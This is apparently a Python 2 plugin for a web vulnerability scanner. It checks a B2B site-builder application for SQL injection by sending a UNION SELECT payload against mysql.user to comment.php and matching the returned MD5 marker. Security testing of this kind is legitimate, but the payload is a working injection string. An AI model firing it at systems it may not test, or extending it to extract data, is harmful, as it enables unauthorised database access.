#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url+="comment.php?ctype=1&conid=1%20UNION%20all%20SELECT%20md5(333)%20from%20mysql.user"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('310dcbbf4cce62f762a2aaa148d556bd')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:b2bbulidersqlinjectionscript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:b2bbulidersqlinjectionscript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def